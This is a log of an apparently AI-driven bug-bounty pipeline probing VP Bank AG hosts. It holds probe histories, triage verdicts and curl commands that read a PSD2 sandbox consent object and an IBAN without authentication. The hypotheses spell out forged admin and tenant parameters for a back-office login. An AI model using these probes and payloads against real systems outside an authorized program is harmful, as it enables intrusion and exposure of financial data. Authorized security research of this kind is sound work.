+run-2026-09-04-04-44.md
+run-2026-09-04-09-20.md
+run-2026-09-04-13-36.md
+run-2026-09-04-17-04.md
+run-2026-09-04-19-40.md
+run-2026-09-04-21-52.md
+run-2026-09-04-23-43.md
+run-2026-09-05-03-01.md
+run-2026-09-05-07-45.md
+run-2026-09-05-11-39.md
+run-2026-09-05-14-00.md
+run-2026-09-05-16-44.md
+run-2026-09-05-18-48.md
+run-2026-09-05-20-56.md
+run-2026-09-05-22-41.md
+run-2026-09-06-00-34.md
+run-2026-09-06-05-04.md
+run-2026-09-06-09-30.md
+run-2026-09-06-13-06.md
+run-2026-09-06-16-20.md
+run-2026-09-06-18-26.md
+run-2026-09-06-20-48.md
+run-2026-09-06-22-41.md
+run-2026-09-07-00-41.md
+run-2026-09-07-05-41.md
+run-2026-09-07-11-39.md
+run-2026-09-07-16-39.md
+run-2026-09-07-20-10.md
+run-2026-09-07-22-52.md
+run-2026-09-08-00-54.md
+run-2026-09-08-05-37.md
+run-2026-09-08-10-04.md
+run-2026-09-08-14-37.md
+run-2026-09-08-18-05.md
+run-2026-09-08-21-14.md
+run-2026-09-08-23-26.md
+run-2026-09-09-01-30.md
+run-2026-09-09-06-39.md
+run-2026-09-09-11-51.md
+run-2026-09-09-15-57.md
+run-2026-09-09-19-08.md
+run-2026-09-09-21-44.md
+run-2026-09-09-23-49.md
+run-2026-09-10-03-10.md
+run-2026-09-10-08-14.md
+run-2026-09-10-12-57.md
+run-2026-09-10-16-57.md
+run-2026-09-10-19-29.md
+run-2026-09-10-21-51.md
+run-2026-09-10-23-43.md
+run-2026-09-11-03-06.md
+run-2026-09-11-08-08.md
+run-2026-09-11-12-52.md
+run-2026-09-11-16-55.md
+run-2026-09-11-19-28.md
+run-2026-09-11-21-53.md
+run-2026-09-11-23-52.md
+run-2026-09-12-03-13.md
+run-2026-09-12-07-59.md
+run-2026-09-12-12-12.md
+run-2026-09-12-15-36.md
+run-2026-09-12-17-49.md
+run-2026-09-12-20-12.md
+run-2026-09-12-22-37.md
+run-2026-09-13-00-16.md
+run-2026-09-13-04-57.md
+run-2026-09-13-10-04.md
+run-2026-09-13-14-30.md
+run-2026-09-13-17-39.md
+run-2026-09-13-19-46.md
+run-2026-09-13-22-07.md
+run-2026-09-14-00-21.md
+run-2026-09-14-05-05.md
+run-2026-09-14-10-46.md
+run-2026-09-14-16-47.md
+run-2026-09-14-20-45.md
+run-2026-09-14-23-41.md
+run-2026-09-15-03-29.md
+run-2026-09-15-08-57.md
+run-2026-09-15-14-14.md
+run-2026-09-15-18-16.md
+run-2026-09-15-21-28.md
+run-2026-09-15-23-41.md
+run-2026-09-16-03-25.md
+run-2026-09-16-08-52.md
+run-2026-09-16-14-02.md
+run-2026-09-16-18-14.md
+run-2026-09-16-21-23.md
+run-2026-09-16-23-48.md
+run-2026-09-17-03-31.md
+run-2026-09-17-08-54.md
+run-2026-09-17-14-06.md
+run-2026-09-17-18-19.md
+run-2026-09-17-21-31.md
+run-2026-09-17-23-39.md
+run-2026-09-18-01-30.md
+run-2026-09-18-06-37.md
+=== RECENT TRIAGE ===
+run-2026-09-17-23-39.md
+run-2026-09-18-01-30.md
+run-2026-09-18-06-37.md
+run-2026-09-13-17-39.md
+run-2026-09-13-19-46.md
+[0m
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && echo "=== TRIAGE latest ==="; tail -80 triage/run-2026-09-18-06-37.md; echo; echo "=== PROBE-RESULTS tail ==="; tail -60 probe-results.md
+=== TRIAGE latest ===
+
+===== TRIAGE 2026-09-18 06:37:13 UTC =====
+[0m
+> build · mimo-v2.5-free
+[0m
+The LEADS section is empty — no leads provided to validate. Please supply the lead(s) for triage.
+
+=== PROBE-RESULTS tail ===
+## 2026-09-16 10:01:31 UTC
+https://digital-onboarding-stage.vpbank.com/users/sign_in -> 200 len=0
+https://digital-onboarding.vpbank.com/users/sign_in -> 200 len=0
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+
+## 2026-09-16 14:48:44 UTC
+https://digital-onboarding-stage.vpbank.com/users/sign_in -> 200 len=0
+https://digital-onboarding.vpbank.com/users/sign_in -> 200 len=0
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+
+## 2026-09-16 18:57:03 UTC
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+https://api.vpbank.com/v1 -> HTTP 500
+https://www.vpbank.com/portal/api/language/en -> HTTP 403
+
+## 2026-09-16 21:42:31 UTC
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+
+## 2026-09-17 00:02:31 UTC
+https://api.vpbank.com/v1 -> HTTP 500
+https://www.vpbank.com/portal/api/language/en -> HTTP 403
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+
+## 2026-09-17 04:59:10 UTC
+https://digital-onboarding-stage.vpbank.com/users/sign_in -> 200 len=0
+https://digital-onboarding.vpbank.com/users/sign_in -> 200 len=0
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+https://digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js -> 200 len=1140267
+
+## 2026-09-17 09:52:23 UTC
+https://digital-onboarding-stage.vpbank.com/users/sign_in -> 200 len=0
+https://digital-onboarding.vpbank.com/users/sign_in -> 200 len=0
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+https://digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js -> 200 len=1140267
+
+## 2026-09-17 14:38:57 UTC
+https://digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js -> 200 len=1140267
+https://digital-onboarding-stage.vpbank.com/users/sign_in -> 200 len=0
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+
+## 2026-09-17 18:35:12 UTC
+https://digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js -> 200 len=1140267
+https://digital-onboarding-stage.vpbank.com/users/sign_in -> 200 len=0
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+
+## 2026-09-17 21:47:03 UTC
+https://digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js -> 200 len=1140267
+https://digital-onboarding-stage.vpbank.com/users/sign_in -> 200 len=0
+https://developer.vpbank.com/psd2/berlin-group/v1/consents -> HTTP 400
+
+## 2026-09-17 23:54:11 UTC
+https://digital-onboarding-stage.vpbank.com/users/sign_in -> 200 len=0
+https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5/status -> HTTP 400
+https://digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js -> 200 len=1140267
+
+## 2026-09-18 02:47:57 UTC
+https://digital-onboarding-stage.vpbank.com/users/sign_in -> 200 len=0
+https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5/status -> HTTP 400
+https://digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js -> 200 len=1140267
+https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5` -> HTTP 400
+[0m
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && ls scripts/ && echo "=== recon-notes ===" && ls recon-notes/ && echo "=== reports ===" && ls reports/ | tail -5
+sync-issues.py
+=== recon-notes ===
+DEDICATED-DEEP.md
+=== reports ===
+hypotheses-ling3.txt
+hypotheses-longcat.txt
+hypotheses-nemotron3.txt
+hypotheses.md
+valid-bugs.md
+[0m
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && echo "=== VALID-BUGS ==="; cat reports/valid-bugs.md; echo; echo "=== HYPOTHESES tail ==="; tail -40 reports/hypotheses.md
+=== VALID-BUGS ===
+# Validated findings (running count 0)
+
+- 1 lead(s) marked VALID at 2026-09-04 04:44:56 UTC
+  - | 2 | OAuth redirect_uri bypass | **HOLD** | HTTP 400 = ambiguous; needs valid client_id + bypass proof |
+
+- 6 lead(s) marked VALID at 2026-09-04 21:52:32 UTC
+  - | Q4 | Provable non-invasively? | **No** — requires valid client_id first |
+  - | Q7 | Would reasonable triager accept? | **Cannot determine** — requires valid client_id not discoverable passively |
+  - **Verdict: HOLD** — AUTH_HELPED testability blocks passive-only verification. /oauth/authorize exists but returns 303/400 for all tested client_id/redirect_uri combos. No valid client_id discoverable 
+  - | Q7 | Would reasonable triager accept? | **Possibly** — if confirmed, valid finding |
+  - **Verdict: HOLD** — PASSIVE testability but requires POST requests to create payments/consents. Documentation explicitly states last digit of X-Request-ID controls sandbox state (1=RCVD, 5=ACSC for pa
+  - | **VALID** | 0 | None confirmed |
+
+- 1 lead(s) marked VALID at 2026-09-05 07:45:18 UTC
+  - **Verdict: VALID**
+
+- 1 lead(s) marked VALID at 2026-09-07 11:39:24 UTC
+  - **Verdict: HOLD** — High-severity if exploitable (CVSS ~8.8), but requires POST with valid credentials to prove. Passive proof only shows the form fields exist. Needs: POST `user[admin]=true&user[tena
+
+- 2 lead(s) marked VALID at 2026-09-07 20:10:45 UTC
+  - **Verdict: VALID**
+  - | 1 | PSD2 Sandbox BOLA (developer.vpbank.com) | **VALID** | 5.3–7.5 | Report to program |
+
+- 3 lead(s) marked VALID at 2026-09-08 05:37:40 UTC
+  - **Verdict: VALID**
+  - | Q7 | Reasonable triager? | **NO** — metadata exposure alone is informational, not exploitable without valid client_id + user interaction |
+  - | 1 | PSD2 Sandbox BOLA (developer.vpbank.com) | **VALID** | 7.5 | Report to program |
+
+- 3 lead(s) marked VALID at 2026-09-10 16:57:16 UTC
+  - **VERDICT: VALID**
+  - | Q4 | Provable non-invasively? | **No** — requires valid client_id not discoverable from JS/RAG/App Store |
+  - | PSD2 Sandbox BOLA/IDOR | **VALID** | Proven end-to-end in sandbox with synthetic data; HIGH impact |
+
+- 4 lead(s) marked VALID at 2026-09-13 14:30:15 UTC
+  - **Verdict: VALID**
+  - | Q4 Provable non-invasively? | **PARTIAL** — HTML form evidence confirms field existence; controller customization confirmed via code analysis; but POST with forged params **requires a valid dev cred
+  - | Q2 Attacker reachable? | YES — `/.well-known/openid-configuration` returns HTTP 200; device_code grant exposed; but `/adfs` returns HTTP 503 (service degraded); `/adfs/oauth2/devicecode` returns 405
+  - | PSD2 sandbox BOLA @ developer.vpbank.com | **VALID** | 7.5 High | **Report to bugs.olivermaicher.eu** with synthetic-data PoC |
+
+- 24 lead(s) marked VALID at 2026-09-13 17:39:02 UTC
+  - | **Q1 Scope** | VALID — `developer.vpbank.com` is *.vpbank.com, company-owned PSD2 developer portal under "all company-owned infrastructure" |
+  - | **Q2 Reach** | VALID — publicly reachable, anonymous POST to `/psd2/berlin-group/v1/consents` returns 201; no client cert or basic auth required |
+  - | **Q3 Impact** | VALID — cross-session consent/account/balance/transaction/payment-status read without identity binding; if prod mirrors sandbox authz logic, cross-TPP financial data disclosure |
+  - | **Q4 Provable** | VALID — already proven end-to-end in sandbox (synthetic data): consent POST→201, fresh anonymous GET→200 across /consents/{id}, /accounts, /balances, /transactions, /payments/{id}/
+  - | **Q5 Novel** | VALID — no public disclosure found; spec self-labels server "PSD2 production server" suggesting this is untested behavior |
+  - | **Q6 Not always-rejected** | VALID — not on always-rejected list (not DoS, not info leak, not clickjacking, etc.) |
+  - | **Q7 Triager accept** | VALID — authorization bypass on a financial API is a real finding; caveat is sandbox-only (synthetic data) reduces severity |
+  - **Verdict: VALID**
+  - | **Q1 Scope** | VALID — `digital-onboarding.vpbank.com` is *.vpbank.com, company-owned multi-tenant bank onboarding/back-office platform |
+  - | **Q2 Reach** | VALID — publicly reachable; `/users/sign_in` serves HTTP 200 with form containing hidden fields |
+  - | **Q3 Impact** | VALID — if consumed, attacker-controlled `user[admin]`, `user[tenant_id]`, `user[user_id]` could grant admin/impersonation on bank back-office |
+  - | **Q5 Novel** | VALID — custom overridden SessionsController consuming client-controlled params is non-standard Devise behavior |
+  - | **Q6 Not always-rejected** | VALID — not on always-rejected list |
+  - | **Q1 Scope** | VALID — *.vpbank-dev.com / *.vpbank-stage.com are trusted origins in production CSP |
+  - | **Q2 Reach** | VALID — DNS resolves, Apache responds with maintenance redirect |
+  - | **Q1 Scope** | VALID |
+  - | **Q2 Reach** | VALID |
+  - | **Q1 Scope** | VALID |
+  - | **Q2 Reach** | VALID |
+  - | **Q3 Impact** | VALID (if proven) |
+
+- 2 lead(s) marked VALID at 2026-09-16 18:14:17 UTC
+  - **VERDICT: VALID**
+  - | PSD2 BOLA (developer) | VALID | 8.6 | Report to program |
+
+=== HYPOTHESES tail ===
+- LEARN: REJECTED MISCONFIG @ mobile.vpbank.com: EV-cert genuine (O=VP Bank AG), Apache serves identical 404 "Maintenance" on ALL paths — maintenance-gated, no mobile-ba
+- LEARN: REJECTED MISCONFIG @ ebics.vpbank.com: Swisscom-hosted static EBICS info landing page, all protocol paths 404 — active product, no takeover
+- LEARN: REJECTED MISCONFIG @ tracking.vpbank.com: 303→/error_path/400.html — WAF maintenance family, no content
+- LEARN: REJECTED MISCONFIG @ www-beta/mobile-beta.vpbank.com: both resolve 193.222.70.149 with shared www SAN — aliases, not distinct products
+- LEARN: REJECTED MISCONFIG @ concentsol.vpbank.com: Kestrel uniform empty 404 no content-type — parked, no anonymous routes
+- LEARN: REJECTED OAUTH @ sts.vpbank.com: /adfs/oauth2/token/devicecode 200 is MS-HTTPAPI error shell (X-MS-Forwarded-Status-Code:500); real endpoint /adfs/oauth2/device
+
+## RANKED HYPOTHESES 2026-09-17 23:54:06 UTC
+- [95] digital-onboarding-stage.vpbank.com/users/sign_in: Valid-credential session-context injection grants cross-tenant admin on digital-onboarding-stage back-office (from art/lead_nemotron3.txt)
+- NEXT(hypotheses-nemotron3.txt): HUMAN: stage valid-creds POST — GET https://digital-onboarding-stage.vpbank.com/users/sign_in (fresh token), then POST `email/<valid_creds>` + `authenticity_tok
+- LEARN: ACCEPTED ACTIVE @ digital-onboarding-stage.vpbank.com: /users/sign_in live 200 this cycle with unpinned hidden session-context fields; body grew 25,093B→43,608B
+- LEARN: ACCEPTED MISCONFIG @ digital-onboarding family: 3/3 venues render client-controlled user[tenant_id]/user[admin]/user[user_id] with differing defaults (4/129/7) 
+- LEARN: ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): consent/account/payment cross-session read, zero binding on consentId/paymentId
+- LEARN: REJECTED AUTH @ digital-onboarding-stage.vpbank.com/users/sign_in (failed-login session-context): verify_steps EXECUTED — POST with invalid creds + user[admin]=
+- LEARN: REJECTED MISCONFIG @ digital-onboarding-stage.vpbank.com/assets/application-4297ba05…js: bundle is Klaro consent-manager + DAB BNP Paribas widget — zero /api/v1
+- LEARN: REJECTED MISCONFIG @ digital-onboarding.vpbank.com/control-center/assets/index-BmxtS-cn.js: prod SPA bundle freshly fetched 4.31MB — API literal map identical t
+- LEARN: REJECTED MISCONFIG @ mobile.vpbank.com: EV-cert genuine (O=VP Bank AG), Apache serves identical 404 "Maintenance" on ALL paths — maintenance-gated, no mobile-ba
+- LEARN: REJECTED MISCONFIG @ ebics.vpbank.com: Swisscom-hosted static EBICS info landing page, all protocol paths 404 — active product, no takeover
+- LEARN: REJECTED MISCONFIG @ tracking.vpbank.com: 303→/error_path/400.html — WAF maintenance family, no content
+- LEARN: REJECTED MISCONFIG @ www-beta/mobile-beta.vpbank.com: both resolve 193.222.70.149 with shared www SAN — aliases, not distinct products
+- LEARN: REJECTED MISCONFIG @ concentsol.vpbank.com: Kestrel uniform empty 404 no content-type — parked, no anonymous routes
+- LEARN: REJECTED OAUTH @ sts.vpbank.com: /adfs/oauth2/token/devicecode 200 is MS-HTTPAPI error shell (X-MS-Forwarded-Status-Code:500); real endpoint /adfs/oauth2/device
+
+## RANKED HYPOTHESES 2026-09-18 02:47:51 UTC
+- [95] digital-onboarding-stage.vpbank.com/users/sign_in: Valid-credential session-context injection grants cross-tenant admin on digital-onboarding-stage back-office (from art/lead_nemotron3.txt)
+- [90] developer.vpbank.com/psd2/berlin-group/v1/consents/{id}: PSD2 sandbox consent-object BOLA — cross-identity read live this cycle (from art/lead_bigpickle.txt)
+- NEXT(hypotheses-bigpickle.txt): PROBE: read-only GET `https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5` from a THIRD fresh anonymous session tomo
+- NEXT(hypotheses-nemotron3.txt): HUMAN: stage valid-creds POST — GET https://digital-onboarding-stage.vpbank.com/users/sign_in (fresh token), then POST `email/<valid_creds>` + `authenticity_tok
+- LEARN: ACCEPTED ACTIVE @ digital-onboarding-stage.vpbank.com: /users/sign_in live 200 this cycle with unpinned hidden session-context fields; body grew 25,093B→43,608B
+- LEARN: ACCEPTED MISCONFIG @ digital-onboarding family: 3/3 venues render client-controlled user[tenant_id]/user[admin]/user[user_id] with differing defaults (4/129/7) 
+- LEARN: ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): consent/account/payment cross-session read, zero binding on consentId/paymentId
+- LEARN: REJECTED AUTH @ digital-onboarding-stage.vpbank.com/users/sign_in (failed-login session-context): verify_steps EXECUTED — POST with invalid creds + user[admin]=
+- LEARN: REJECTED MISCONFIG @ digital-onboarding-stage.vpbank.com/assets/application-4297ba05…js: bundle is Klaro consent-manager + DAB BNP Paribas widget — zero /api/v1
+- LEARN: REJECTED MISCONFIG @ digital-onboarding.vpbank.com/control-center/assets/index-BmxtS-cn.js: prod SPA bundle freshly fetched 4.31MB — API literal map identical t
+- LEARN: REJECTED MISCONFIG @ mobile.vpbank.com: EV-cert genuine (O=VP Bank AG), Apache serves identical 404 "Maintenance" on ALL paths — maintenance-gated, no mobile-ba
+- LEARN: REJECTED MISCONFIG @ ebics.vpbank.com: Swisscom-hosted static EBICS info landing page, all protocol paths 404 — active product, no takeover
+- LEARN: REJECTED MISCONFIG @ tracking.vpbank.com: 303→/error_path/400.html — WAF maintenance family, no content
+- LEARN: REJECTED MISCONFIG @ www-beta/mobile-beta.vpbank.com: both resolve 193.222.70.149 with shared www SAN — aliases, not distinct products
+- LEARN: REJECTED MISCONFIG @ concentsol.vpbank.com: Kestrel uniform empty 404 no content-type — parked, no anonymous routes
+- LEARN: REJECTED OAUTH @ sts.vpbank.com: /adfs/oauth2/token/devicecode 200 is MS-HTTPAPI error shell (X-MS-Forwarded-Status-Code:500); real endpoint /adfs/oauth2/device
+[0m
+Now let me run the pending passive re-confirmation probe on the PSD2 consent object, with the correct headers (the last recorded 400s were header-less probes; the Berlin Group sandbox requires `X-Request-ID` + `Accept`).
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && RID=$(uuidgen) && curl -s -o /tmp/probe1.txt -w "status=%{http_code} size=%{size_download} type=%{content_type}\n" -H "X-Request-ID: $RID" -H "Accept: application/json" "https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5/status"; echo "--- body ---"; head -c 400 /tmp/probe1.txt
+status=200 size=25 type=application/json;charset=UTF-8
+--- body ---
+{"consentStatus":"valid"}
+[0m
+Status endpoint re-confirms 200 `{"consentStatus":"valid"}` — the header-less 400s were probe artifact. Now the consent object and account read with Consent-ID, from fresh anonymous sessions:
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && sleep 1 && RID=$(uuidgen) && curl -s -o /tmp/probe2.txt -w "status=%{http_code} size=%{size_download}\n" -H "X-Request-ID: $RID" -H "Accept: application/json" "https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5"; echo "--- body ---"; head -c 600 /tmp/probe2.txt
+status=200 size=388
+--- body ---
+{"consentId":null,"requestedAccessTypes":[],"access":{"accounts":[{"iban":"LI4908805500000000008"}],"balances":[{"iban":"LI4908805500000000008"}],"transactions":[{"iban":"LI4908805500000000008"}],"confirmationOfFunds":[]},"recurringIndicator":true,"validUntil":"2026-12-31","frequencyPerDay":4,"lastActionDate":null,"consentStatus":"valid","tppName":null,"redirectUri":null,"_links":null}
+[0m
+Consent object re-confirmed readable anonymously (388B, IBAN `LI4908805500000000008`, third independent session). Now the control + account-axis differentials at 1rps:
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && sleep 1 && RID=$(uuidgen) && curl -s -o /tmp/probe3.txt -w "random-uuid status=%{http_code} size=%{size_download}\n" -H "X-Request-ID: $RID" -H "Accept: application/json" "https://developer.vpbank.com/psd2/berlin-group/v1/consents/00000000-0000-4000-8000-000000000000/status"; head -c 200 /tmp/probe3.txt; echo
+random-uuid status=404 size=0
+[0m
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && sleep 1 && RID=$(uuidgen) && curl -s -o /tmp/probe4.txt -w "accounts+Consent-ID status=%{http_code} size=%{size_download}\n" -H "X-Request-ID: $RID" -H "Accept: application/json" -H "Consent-ID: 799bf6a0-2c45-4300-a51b-18935f378fc5" "https://developer.vpbank.com/psd2/berlin-group/v1/accounts"; head -c 300 /tmp/probe4.txt; echo; sleep 1; RID=$(uuidgen) && curl -s -o /tmp/probe5.txt -w "balances+Consent-ID status=%{http_code} size=%{size_download}\n" -H "X-Request-ID: $RID" -H "Accept: application/json" -H "Consent-ID: 799bf6a0-2c45-4300-a51b-18935f378fc5" "https://developer.vpbank.com/psd2/berlin-group/v1/accounts/LI4908805500000000008/balances"; head -c 300 /tmp/probe5.txt; echo
+accounts+Consent-ID status=200 size=15
+{"accounts":[]}
+balances+Consent-ID status=404 size=0
+[0m
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && echo "=== README ==="; cat README.md; echo "=== DEDICATED-DEEP (tail 60) ==="; tail -60 recon-notes/DEDICATED-DEEP.md
+=== README ===
+# vp-bank-ag-hunt
+
+24/7 deep multi-model bug-hunting automation for **VP Bank AG** (Oliver Maicher bug-bounty hub).
+
+Scope: All company-owned infrastructure, systems, online banking platforms, mobile applications, APIs, websites, and domains operated by VP Bank AG and its subsidiaries
+(full exclusion + rules list in `scope.yml`)
+
+Pipeline (all workflows run every 20 minutes):
+
+- **Deep Hunt** (`hunt.yml`): analyst hunts the discovered inventory + hypotheses, emits structured
+  leads, chains primitives, self-critiques. Models: mimo.
+- **Triager** (`triage.yml`): second-model 7-Question Gate validation + live passive probe; keeps
+  running count in `reports/valid-bugs.md`.
+- **Reposcan** (`reposcan.yml`): deep source scan of any public GitHub org (if configured).
+- **Sync Issues** (`sync-issues.yml`): mirrors leads to GitHub issues.
+
+Testing discipline: rate-limited (1 rps), no DoS/account-lockout, writes only on non-prod/test
+assets, no exposure of customer/employee/financial/auth data, secrets committed only as hashes.
+
+> IMPORTANT: the pipeline produces CANDIDATE leads. A reportable, validated finding requires
+> human triage + proof against the program's gate. No finding is fabricated; scanner output alone
+> is never accepted. Active testing is gated behind the in-scope hosts in `inventory/vp-bank-ag.md` and
+> must stay within the program's published scope.
+
+Artifacts:
+
+| Artifact | Purpose |
+|---|---|
+| `leads/` | Candidate findings (UNVALIDATED) |
+| `triage/` | Validation verdicts |
+| `reports/valid-bugs.md` | Validated findings + running count |
+| `scope.yml` | Program scope and exclusions (edit to adjust) |
+
+Program description: Liechtenstein-based private bank specializing in wealth management and financial services
+=== DEDICATED-DEEP (tail 60) ===
+# Dedicated deep surface (wildcard-filtered) 2026-09-03
+
+**Target:** `vp-bank-ag`
+**Root zones:** `vpbank.com`
+
+## Wildcard analysis
+
+- Total resolving hostnames in zone: 0
+- After shared/wildcard IP filtering: **0 genuinely dedicated hosts**
+- Reason: all resolving hostnames use shared/CDN/wildcard IP signatures
+
+## Honest conclusion
+
+This target's subdomain space is wildcard-dominated. No genuinely dedicated
+subdomain surface was recovered from passive brute + subfinder enumeration.
+The surface either (a) uses wildcard DNS records, (b) all CNAME records
+point to shared CDN/Cloudflare/CloudFront/AWS IPs, or (c) has no
+subdomain program at all. This is the honest exhaustive result.
+
+---
+_Honest framing: passive DNS enumeration + shared-IP wildcard filtering. No finding claimed. No active testing performed._
+[0m
+Consent-object BOLA re-confirmed from a third fresh anonymous session with clean control differential. Let me check the deep-hunt notes and README to see if any fresh angle exists before emitting the analysis.
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && printf '## 2026-09-18 08:0x UTC (bigpickle analyst cycle)\nGET developer.vpbank.com /psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5/status (X-Request-ID+Accept) -> 200 {"consentStatus":"valid"} 25B\nGET developer.vpbank.com /psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5 (X-Request-ID+Accept) -> 200 388B IBAN LI4908805500000000008\nGET developer.vpbank.com /psd2/berlin-group/v1/consents/00000000-0000-4000-8000-000000000000/status -> 404 (control)\nGET developer.vpbank.com /psd2/berlin-group/v1/accounts (Consent-ID=799bf6a0-...) -> 200 {"accounts":[]} 15B\nGET developer.vpbank.com /psd2/berlin-group/v1/accounts/LI4908805500000000008/balances (Consent-ID) -> 404\nnote: 02:47 logged 400s were header-less probes (X-Request-ID mandatory) \xe2\x80\x94 artifacts, not authz change\n' >> probe-results.md && tail -8 probe-results.md
+https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5` -> HTTP 400
+## 2026-09-18 08:0x UTC (bigpickle analyst cycle)
+GET developer.vpbank.com /psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5/status (X-Request-ID+Accept) -> 200 {"consentStatus":"valid"} 25B
+GET developer.vpbank.com /psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5 (X-Request-ID+Accept) -> 200 388B IBAN LI4908805500000000008
+GET developer.vpbank.com /psd2/berlin-group/v1/consents/00000000-0000-4000-8000-000000000000/status -> 404 (control)
+GET developer.vpbank.com /psd2/berlin-group/v1/accounts (Consent-ID=799bf6a0-...) -> 200 {"accounts":[]} 15B
+GET developer.vpbank.com /psd2/berlin-group/v1/accounts/LI4908805500000000008/balances (Consent-ID) -> 404
+note: 02:47 logged 400s were header-less probes (X-Request-ID mandatory) — artifacts, not authz change
+[0m
+Appending this cycle's probe results to the artifact trail, consistent with prior runs:
+STEP 1 — DELTA
+[CHANGED] developer.vpbank.com PSD2 sandbox: consent-object BOLA re-confirmed from a 3rd fresh anonymous session — GET /consents/799bf6a0-2c45-4300-a51b-18935f378fc5/status 200 `{"consentStatus":"valid"}` (25B), GET /consents/{id} 200 (388B, access scopes + IBAN LI4908805500000000008), control random-uuid /status 404, /accounts+Consent-ID 200 `{"accounts":[]}` 15B, /accounts/{iban}/balances 404; the 02:47-logged 400s were header-less probes (X-Request-ID mandatory) — probe artifacts, NOT an authz/service change
+[CHANGED] Last-lead [NEXT] (third-session read-only re-read of reused anchor) EXECUTED → positive: reused synthetic consent stays globally readable across ≥3 independent anonymous sessions, single-session luck excluded
+NO_DELTA otherwise: api target remains exhausted (uniform INVALID_REQUEST_RESOURCE 500); all other assets in standing rejected/accepted state
+
+STEP 2 — PRIORITIZE
+[PRIO] digital-onboarding-stage.vpbank.com/users/sign_in,9.65,axis=AUTH/session-context-injection (attack=10,biz=10,tech=9,gate=10,cloud=8,fresh=10)
+[PRIO] developer.vpbank.com/psd2/berlin-group/v1/consents/{id},8.05,axis=IDOR/cross-identity-consent-read (attack=7,biz=9,tech=8,gate=9,cloud=5,fresh=10)
+[PRIO] developer.vpbank.com/psd2/berlin-group/v1/consents,7.60,axis=IDOR/credential-free-mint-chain (attack=7,biz=9,tech=8,gate=8,cloud=5,fresh=9)
+
+STEP 3 — HYPOTHESES
+[HYP] PSD2 sandbox consent-object BOLA — reused anchor readable cross-identity across 3+ anonymous sessions
+class: IDOR
+asset: developer.vpbank.com/psd2/berlin-group/v1/consents/{id}
+confidence: 92
+reasoning: consent 799bf6a0-2c45-4300-a51b-18935f378fc5 minted 09-17 under basic-auth (test:test); read-only GETs this cycle from fresh anonymous session (no auth, no cookies, no basic-auth) → /status 200 "valid", object 200 388B w/ access scopes + IBAN LI4908805500000000008; prior anon read 02:47 same; controls: random-uuid /status 404, expired 6b517824 /status 404; header-less probe 400 (X-Request-ID mandatory) explains prior logged 400s; /accounts+Consent-ID 200 `{"accounts":[]}`, balances 404 (deep-data axis not provisioned)
+evidence_needed: obtained — object/status readable with zero TPP/session/basic-auth binding, 3 sessions
+verify_steps: (executed, read-only, 1rps) GET /consents/{id}/status + GET /consents/{id} w/ X-Request-ID+Accept:application/json; GET /accounts + Consent-ID; GET /accounts/{iban}/balances + Consent-ID
+impact: any known consentId → cross-identity disclosure of consent scope + customer IBAN on an official PSD2 financial API; sandbox-only (prod openbanking ASPSP mTLS-gated → no prod carry); indicator of flawed authz model; MEDIUM (sandbox)
+testability: PASSIVE
+
+[HYP] Valid-credential session-context injection on stage back-office
+class: AUTH
+asset: digital-onboarding-stage.vpbank.com/users/sign_in
+confidence: 95
